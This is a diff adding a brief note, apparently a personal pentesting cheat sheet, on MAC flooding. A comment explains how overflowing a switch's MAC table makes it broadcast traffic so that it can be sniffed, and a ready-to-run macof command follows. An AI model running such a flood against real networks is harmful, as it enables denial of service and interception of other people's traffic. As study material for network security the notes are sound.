@@ -1,0 +1,4 @@
+# Flood a switch with thousands of MAC addresses to attempt to make it act like a hub, that is to broadcast all traffic like a hub by making it incapable of reading or or accessing valid entries in the MAC to port table. If it is fail closed, it wont act like a hub, but means its susceptible to ddos, fail open and you can sniff.
+macof -i eth0 -s 192.168.1.1 -d 192.168.18.2 # -s source, -d target
+
+
